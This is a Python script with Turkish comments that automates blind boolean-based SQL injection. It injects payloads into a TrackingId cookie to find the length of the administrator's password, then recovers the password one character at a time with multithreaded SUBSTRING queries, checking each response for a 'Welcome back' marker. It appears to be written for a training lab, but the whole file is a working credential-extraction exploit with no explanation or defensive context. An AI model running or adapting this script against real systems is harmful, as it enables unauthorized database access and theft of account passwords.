import requests
import concurrent.futures

# Kullanıcıdan gerekli bilgileri al
url = input("URL'i girin: ")
tracking_id = input("Tracking ID'yi girin: ")
session_id = input("Session ID'yi girin: ")
chars = 'abcdefghijklmnopqrstuvwxyz0123456789'

def check_response(payload):
    cookies = {'TrackingId': payload, 'session': session_id}
    response = requests.get(url, cookies=cookies)
    print(f"Payload: {payload} | Status Code: {response.status_code}")
    print(f"Response Text: {response.text[:500]}")
    return 'Welcome back' in response.text  # Koşul sağlandığında dönecek yanıtın bir parçası

def find_password_length():
    for length in range(1, 25):  # Şifrenin 1'den 25'e kadar olan uzunluklarını dene
        payload = f"{tracking_id}' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')={length}--"
        print(f"Testing length: {length}")
        if check_response(payload):
            return length
    return None

def find_char_for_position(position):
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        future_to_char = {executor.submit(check_response, f"{tracking_id}' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'), {position}, 1)='{char}'--"): char for char in chars}
        for future in concurrent.futures.as_completed(future_to_char):
            char = future_to_char[future]
            try:
                if future.result():
                    return char
            except Exception as exc:
                print(f'{char} generated an exception: {exc}')
    return None

def find_password(password_length):
    password = ''
    for i in range(1, password_length + 1):
        char = find_char_for_position(i)
        if char:
            password += char
            print(f"Found character: {char} at position {i}")
        else:
            print(f"Could not find character at position {i}")
            break
    return password

# Şifrenin uzunluğunu bul
password_length = find_password_length()
if password_length:
    print(f"Password length: {password_length}")
    # Şifreyi bul
    password = find_password(password_length)
    print(f"Password: {password}")
else:
    print("Could not determine password length.")
